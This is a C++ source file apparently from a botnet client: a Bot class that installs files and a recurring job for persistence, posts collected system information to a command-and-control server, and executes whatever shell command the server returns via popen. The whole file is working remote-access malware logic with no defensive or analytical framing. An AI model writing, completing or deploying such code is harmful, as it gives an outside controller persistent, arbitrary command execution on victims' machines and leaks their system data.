#include "bot.hh"

#include <iostream>
#include <memory>
#include <string>

#include "installer.hh"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

// Initialize auth file and object to collect system info
Bot::Bot(const std::string& install_dir) {
    install_ = std::make_unique<Installer>(install_dir);
    std::string auth_hash = install_->GetAuthHash();
    sysinfo_ = std::make_unique<sysinfo::DataList>(auth_hash);
}

bool Bot::IsNew() { return install_->IsNew(); }

// Install files and components
void Bot::Install() {
    install_->InstallFiles();
    install_->InitRecurringJob();
}

// Register bot with C2 server
void Bot::RegisterBot(const std::string& register_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    request::Post(register_url, data);
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    std::string response = request::Post(command_url, data);

    // Parse JSON response from C2 server and execute command
    Command cmd(response);
    cmd.Execute();
}

Command::Command(std::string& c2_response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2_response.c_str());

    if (json.IsObject()) {
        command_text = json["command_text"].IsString()
                           ? json["command_text"].GetString()
                           : "";
        shell =
            json["shell"].IsString() ? json["shell"].GetString() : "default";
    } else {
        shell = "default";
    }
}

std::string Command::Execute() {
    /* Add necessary syntax before and after command
     * depending on shell choice */
    std::string string_to_exec;

    if (shell == "default") {
        string_to_exec = command_text;
    } else {
        std::string pre_text, post_text;
        std::tie(pre_text, post_text) = SHELL_SYNTAX_LIST.at(shell.c_str());
        string_to_exec = pre_text + command_text + post_text;
    }

    return util::PopenSubprocess(string_to_exec.c_str());
}